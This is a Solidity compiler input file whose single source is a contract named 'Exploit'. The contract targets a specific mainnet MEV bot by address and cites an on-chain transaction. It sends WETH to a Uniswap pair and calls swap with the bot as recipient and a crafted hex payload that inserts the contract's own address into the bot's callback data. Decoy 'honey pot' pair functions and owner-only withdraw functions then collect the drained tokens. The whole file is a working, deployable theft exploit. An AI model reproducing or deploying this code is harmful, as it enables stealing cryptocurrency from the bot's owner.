{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/one.sol": {
      "content": "pragma solidity ^0.7.4;\n\nlibrary IgnorantERC20 {\n    function ignorantTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        address(token).call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, value));\n    }\n\n    function ignorantTransfer(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal {\n        address(token).call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));\n    }\n\n    function ignorantApprove(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal {\n        address(token).call(abi.encodeWithSelector(IERC20.approve.selector, to, value));\n    }\n\n    function safeTransferETH(address to, uint256 value) internal {\n        to.call{ value: value }(new bytes(0));\n    }\n}\n\ninterface IUniswapV2Callee {\n    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;\n}\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint256 amount0In,\n        uint256 amount1In,\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n    function factory() external view returns (address);\n\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (\n            uint112 reserve0,\n            uint112 reserve1,\n            uint32 blockTimestampLast\n        );\n\n    function price0CumulativeLast() external view returns (uint256);\n\n    function price1CumulativeLast() external view returns (uint256);\n\n    function kLast() external view returns (uint256);\n\n    function mint(address to) external returns (uint256 liquidity);\n\n    function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function skim(address to) external;\n\n    function sync() external;\n\n    function initialize(address, address) external;\n}\n\ninterface IWETH {\n    function name() external view returns (string memory);\n\n    function approve(address guy, uint256 wad) external returns (bool);\n\n    function totalSupply() external view returns (uint256);\n\n    function transferFrom(\n        address src,\n        address dst,\n        uint256 wad\n    ) external returns (bool);\n\n    function withdraw(uint256 wad) external;\n\n    function decimals() external view returns (uint8);\n\n    function balanceOf(address) external view returns (uint256);\n\n    function symbol() external view returns (string memory);\n\n    function transfer(address dst, uint256 wad) external returns (bool);\n\n    function deposit() external payable;\n\n    function allowance(address, address) external view returns (uint256);\n}\n\n\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function decimals() external view returns (uint8);\n\n    function name() external view returns (string memory);\n}\n\n\ncontract Exploit {\n    // Transaction 0xe8e8478667169bfa428214071930a3bc11f3bf5955ef0664868ba609ee03ef98\n    using IgnorantERC20 for IERC20;\n\n    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address internal constant MEV_BOT = 0x000000000755567F4924bf483BdF5A53EBc8Ef64;\n\n    address internal constant myself = 0x1337b9d19694E68760EEeEDd022237d4D07754b2;\n\n    constructor() {}\n\n    modifier authorized() {\n        require(msg.sender == myself, \"begone\");\n        _;\n    }\n\n    function exploit() public payable authorized {\n        // bytes memory originalPayload = hex\"509813037ee2218799597d83d4a5b6f3b6778218d9c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20100cf6daab95c476106eca715d48de4b13287ffdeaa10ff64cb7ba5717a10dabc4be3a41acd2c2f95ee22003b188af0bb1400000000000005cbecba0ffda253b051874c0000000000000355ea69c127281b60170000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\";\n        IWETH(WETH).deposit{ value: msg.value }();\n        IWETH(WETH).transfer(0xEFb47fcFCaD4F96c83D4ca676842fB03Ef20a477, msg.value);\n\n        bytes memory modifiedPayload = abi.encodePacked(\n            hex\"509813037ee2218799597d83d4a5b6f3b6778218d9c02aaa39b223fe8d0a0e5c\",\n            hex\"4f27ead9083c756cc20100\",\n            address(this),\n            hex\"10\",\n            address(this),\n            hex\"002630ff66d9863e00000000\",\n            hex\"0005cbecba0ffda253b051874c0000000000000355ea69c127281b6017000000\",\n            hex\"0000000000000000000000000000000000000000000000000000000000000000\",\n            hex\"0000000000000000000000000000000000000000000000000000000000000000\",\n            hex\"0000000000000000000000000000000000000000000000000000000000000000\",\n            hex\"0000000000000000000000000000000000000000000000000000000000000000\"\n        );\n        \n        IUniswapV2Pair(0xEFb47fcFCaD4F96c83D4ca676842fB03Ef20a477).swap(\n            0,\n            1,\n            MEV_BOT,\n            modifiedPayload\n        );\n    }\n\n    // Honey pot functions\n    function swap(uint256,uint256,address,bytes memory) public {}\n\n    function token0() public pure returns (address) {\n        return address(0);\n    }\n\n    function token1() public pure returns (address) {\n        return address(0);\n    }\n\n    function zzzwithdrawETH() external authorized {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    function zzzwithdrawETHFromWETH(uint256 _amount) external authorized {\n        IWETH(WETH).withdraw(_amount);\n        msg.sender.transfer(_amount);\n    }\n\n    function zzzrecoverERC20(address t) external authorized {\n        IERC20(t).ignorantTransfer(msg.sender, IERC20(t).balanceOf(address(this)));\n    }\n}\n"
    }
  }
}